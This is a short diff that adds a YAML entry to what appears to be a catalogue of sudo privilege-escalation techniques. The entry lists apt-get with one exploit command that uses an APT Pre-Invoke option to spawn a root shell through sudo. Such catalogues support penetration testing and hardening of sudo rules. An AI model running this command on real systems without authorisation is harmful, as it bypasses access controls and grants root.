@@ -1,0 +1,4 @@
+name: apt-get
+binary_path: /usr/bin/apt-get
+exploit_cmds:
+- sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
